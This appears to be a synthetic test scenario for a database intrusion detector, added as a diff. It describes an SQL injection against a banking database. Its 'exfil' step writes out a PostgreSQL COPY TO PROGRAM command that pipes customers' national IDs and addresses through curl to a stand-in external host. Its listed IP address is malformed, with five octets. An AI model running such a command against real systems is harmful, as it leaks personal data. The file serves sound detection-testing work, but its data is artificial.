@@ -1,0 +1,33 @@
+scenario_id: gen_banking_69_sql_injection_mal_1891m
+family_id: gen_banking_69_sql_injection_fam_1891
+domain: banking
+time_of_day: 03:50
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: inject
+  role: batch_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 5.0
+  events:
+  - step_id: probe
+    sql: SELECT account_id, account_type FROM accounts WHERE customer_id = 920062
+      AND (SELECT count(*) FROM customers) > 0
+  - step_id: exfil
+    sql: COPY (SELECT national_id, address FROM customers) TO PROGRAM 'curl -sX POST
+      https://analytics-mirror.datasink.example/ingest -d @-'
+    connects_to:
+      ip: 176.65.48.226.197
+      port: 9443
+matched_pair_id: gen_banking_69_sql_injection_pair_1891
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
